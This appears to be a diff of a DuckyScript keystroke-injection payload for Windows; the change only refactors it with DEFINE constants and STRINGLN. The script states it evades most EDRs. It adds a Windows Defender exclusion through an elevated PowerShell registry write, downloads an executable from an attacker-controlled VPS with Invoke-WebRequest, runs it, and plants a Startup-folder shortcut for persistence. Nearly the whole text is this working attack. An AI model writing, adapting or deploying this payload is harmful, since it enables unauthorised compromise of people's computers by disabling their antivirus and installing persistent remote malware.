@@ -5,7 +5,8 @@ REM Target: Windows
 REM Note: This evades most EDRs. // Delay is too big for testing purposes, can be lowered significantly. // I removed every instance of my VPS.
 REM Note: replace VPSIPHERE with the IP of your VPS and the correct port (ex:4444) and the name of your payload (ex: Shelzy.exe)
 REM Version: 1.0
-
+DEFINE #VPSISHERE 0.0.0.0
+DEFINE #EXE_NAME Shelzy.exe
 REM Delay for system to recognize and be ready
 DELAY 2000
 DELAY 100
@@ -20,28 +21,23 @@ DELAY 1000
 ENTER
 DELAY 1500
 REM Create Cache folder in Windows/temp
-STRING mkdir "$env:windir\temp\Cache"
-ENTER
+STRINGLN mkdir "$env:windir\temp\Cache"
 DELAY 500
 
 REM Add exclusion in Defender for Cache folder via registry manipulation
-STRING Start-Process powershell -Verb RunAs -ArgumentList 'New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" -Name "C:\Windows\Temp\Cache" -Value "C:\Windows\Temp\Cache" -PropertyType String -Force'
-ENTER
+STRINGLN Start-Process powershell -Verb RunAs -ArgumentList 'New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" -Name "C:\Windows\Temp\Cache" -Value "C:\Windows\Temp\Cache" -PropertyType String -Force'
 DELAY 500
 
 REM Download payload from VPS Invoke-WebRequest
-STRING Invoke-WebRequest -Uri "http://VPSIPHERE:4444/Shelzy.exe" -OutFile "$env:windir\temp\Cache\Shelzy.exe"
-ENTER
+STRINGLN Invoke-WebRequest -Uri "http://#VPSIPHERE:4444/#EXE_NAME" -OutFile "$env:windir\temp\Cache\#EXE_NAME"
 DELAY 3000
 
 REM Execute the downloaded payload
-STRING Start-Process "$env:windir\temp\Cache\Shelzy.exe"
-ENTER
+STRINGLN Start-Process "$env:windir\temp\Cache\#EXE_NAME"
 DELAY 500
 
-REM Add Shelzy.exe to startup
-STRING $s=(New-Object -COM WScript.Shell).CreateShortcut("$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\Shelzy.lnk");$s.TargetPath="$env:windir\temp\Cache\Shelzy.exe";$s.Save()
-ENTER
+REM Add #EXE_NAME to startup
+STRINGLN $s=(New-Object -COM WScript.Shell).CreateShortcut("$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\Shelzy.lnk");$s.TargetPath="$env:windir\temp\Cache\#EXE_NAME";$s.Save()
 DELAY 500
 
 STRING EXIT
